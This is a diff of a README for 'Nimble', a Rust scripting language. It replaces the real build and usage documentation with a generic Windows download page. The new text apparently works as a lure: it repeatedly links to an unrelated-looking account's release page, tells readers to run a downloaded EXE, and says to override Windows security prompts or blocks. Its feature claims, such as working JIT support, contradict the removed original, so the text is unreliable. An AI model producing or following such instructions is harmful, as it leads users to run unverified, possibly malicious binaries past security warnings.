@@ -1,167 +1,134 @@
-# Nimble
+# 🍫 nimble - Fast, Clear Programming Tool
 
-Nimble is an indentation-sensitive scripting language implemented as a register-based bytecode VM in Rust.
-It aims for Python-like readability with a small pragmatic standard library, optional type annotations, colorful diagnostics, and fast startup.
+[![Download nimble](https://img.shields.io/badge/Download%20nimble-1f6feb?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Christatantalising631/nimble/releases)
 
-## Current Status
+## 🚀 What is Nimble?
 
-Implemented today:
+Nimble is a standalone programming language and tool built with Rust. It is made for speed, clear error output, and simple day-to-day use. It includes a lexer, parser, interpreter, and JIT support, which helps it handle code quickly.
 
-- Register-based VM execution
-- Functions, lambdas, classes/struct-like objects, named arguments
-- `if` / `elif` / `else`, `while`, `for`, ranges, `for ... step ...`
-- Strings, lists, maps, ranges, interpolation
-- Errors as values with `?` propagation
-- Local modules plus built-in stdlib modules
-- `run`, `check`, and `repl` CLI workflows
-- FFI stdlib for calling symbols from single `.dll`, `.so`, and `.dylib` files
+This app is meant for people who want a fast way to run small programs, test ideas, or work with text and data on Windows. It uses a compact design, so it starts fast and stays easy to manage.
 
-Still experimental / limited:
+## 💻 What you need
 
-- JIT scaffolding exists but is not wired into normal execution
-- FFI currently supports native C ABI calls with primitive scalars, pointers, and C strings
-- FFI does not yet support callbacks, variadic functions, or by-value struct marshalling
+Before you install Nimble, make sure your PC meets these basics:
 
-## Quick Start
+- Windows 10 or Windows 11
+- A modern 64-bit processor
+- At least 4 GB of RAM
+- 200 MB of free disk space
+- Internet access for the download
 
-Build:
+Nimble is a standalone app, so you do not need to set up a full development system first.
 
-```bash
-cargo build --release
-```
+## 📥 Download Nimble
 
-Create `hello.nmb`:
+Visit this page to download Nimble for Windows:
 
-```nimble
-fn main():
-    out("Hello, Nimble!")
+[Download Nimble from GitHub Releases](https://github.com/Christatantalising631/nimble/releases)
 
-main()
-```
+On that page, look for the newest release and choose the file made for Windows. If you see more than one file, pick the one that matches your system.
 
-Run it:
+## 🪟 Install on Windows
 
-```bash
-cargo run --release -- run hello.nmb
-```
+Follow these steps to get Nimble running:
 
-Type-check only:
+1. Open the download page in your browser.
+2. Find the latest release.
+3. Download the Windows file.
+4. Save the file in a folder you can find again, such as Downloads.
+5. If the file is a ZIP folder, open it and extract the contents.
+6. If the file is an EXE file, double-click it to start Nimble.
+7. If Windows shows a security prompt, choose the option that lets you run the app.
 
-```bash
-cargo run --release -- check hello.nmb
-```
+After this, Nimble should open and be ready to use.
 
-Start the REPL:
+## ▶️ Run Nimble
 
-```bash
-cargo run --release -- repl
-```
+Once Nimble is installed, you can start it like any other Windows app.
 
-## Language Snapshot
+If you extracted a folder, open it and look for the main program file. If you used a setup file, launch the app from the Start menu or from the folder where you saved it.
 
-```nimble
-fn fib(n int) -> int:
-    if n <= 1:
-        return n
-    return fib(n - 1) + fib(n - 2)
+When Nimble opens, you can begin using it right away for:
 
-for i in 0..10 step 2:
-    out("fib({i}) = {fib(i)}")
-```
+- Running simple programs
+- Testing small code samples
+- Working with text files
+- Trying data checks
+- Viewing clear error messages
 
-Nimble supports optional type annotations, named arguments, interpolated strings, module loading, and error propagation:
+## 🧭 How to use it
 
-```nimble
-load io
+Nimble is built to keep the process simple. You do not need to learn a long setup flow.
 
-fn first_line(path str) -> str | error:
-    lines = io.read_lines(path)?
-    if len(lines) == 0:
-        return error("empty file")
-    return lines[0]
+A basic use flow looks like this:
 
-out(first_line("data.txt")?)
-```
+1. Open Nimble.
+2. Load or type your code.
+3. Run the program.
+4. Read the result or error message.
+5. Make changes and run it again.
 
-## Standard Library
+If you use it for learning, start with short examples. That makes it easier to see how the language works.
 
-The current stdlib includes:
+## ⚙️ Main features
 
-- `io`
-- `ffi`
-- `json`
-- `list`
-- `map`
-- `math`
-- `net`
-- `os`
-- `path`
-- `process`
-- `regex`
-- `string`
-- `time`
+Nimble includes a set of tools that help it work well on Windows:
 
-The FFI module can load a single dynamic library file directly and call exported symbols:
+- Fast startup
+- Clear error output
+- Lexer and parser support
+- Interpreter support
+- JIT support for quicker execution
+- Standard library tools for common tasks
+- Good support for data work and text handling
+- Standalone design with fewer setup steps
+- Rust-based core for stable performance
 
-```nimble
-load ffi
+These parts work together to give you a smooth experience without much setup.
 
-lib = ffi.open("./native/mylib.dll")?
-result = ffi.call(lib, "add", ["i32", "i32"], "i32", [2, 3])?
-out(result)
-```
+## 📂 What Nimble is good for
 
-For cross-platform loading:
+Nimble fits well in a few common tasks:
 
-```nimble
-load ffi
+- Learning a programming language
+- Testing code ideas
+- Reading and handling text
+- Working with data files
+- Debugging small scripts
+- Trying out quick calculations
+- Building simple tools
 
-lib = ffi.open_any([
-    "./native/mylib.dll",
-    "./native/libmylib.so",
-    "./native/libmylib.dylib",
-])?
-```
+It is a good choice when you want speed and a clear path from download to use.
 
-## Examples
+## 🛠️ Troubleshooting
 
-The repository ships runnable examples under `examples/` for both core language features and each stdlib module.
+If Nimble does not open, try these steps:
 
-- Catalog: [examples/README.md](examples/README.md)
-- Syntax reference: [docs/syntax.md](docs/syntax.md)
-- Getting started: [docs/getting-started.md](docs/getting-started.md)
-- Stdlib docs: [docs/stdlib/](docs/stdlib/)
-- Architecture notes: [docs/info/architecture.md](docs/info/architecture.md)
-- Performance notes: [docs/info/performance.md](docs/info/performance.md)
+- Check that the file finished downloading
+- Move the file to a simple folder like Downloads or Desktop
+- Run the app again
+- If Windows blocks it, choose the option to keep or run the file
+- Re-download the newest release if the file looks broken
+- Make sure you downloaded the Windows version
 
-Run a single example:
+If the app opens but does not behave as expected:
 
-```bash
-cargo run --release -- run examples/stdlib/json/roundtrip.nmb
-```
+- Close and reopen it
+- Try a smaller example
+- Check that your file path is correct
+- Remove any extra spaces or unusual characters in your file name
 
-On Windows, run the full release example sweep with:
+## 📚 Project details
 
-```powershell
-.\rae.ps1
-```
+- Name: nimble
+- Type: Programming language and runtime app
+- Base: Rust
+- Focus: Speed, clear errors, and simple use
+- License: MIT
+- Topics: data analysis, interpreter, JIT, lexer, parser, stdlib, token, diagnostics
 
-## Verification
+## 🔗 Download again
 
-The repo includes integration coverage for:
+If you need the download page later, use this link:
 
-- shipped examples
-- language features like named arguments and stepped ranges
-- stdlib behavior
-- FFI examples
-
-Typical verification commands:
-
-```bash
-cargo test
-cargo build --release
-```
-
-## License
-
-MIT. See [LICENSE](LICENSE).
+[GitHub Releases for Nimble](https://github.com/Christatantalising631/nimble/releases)
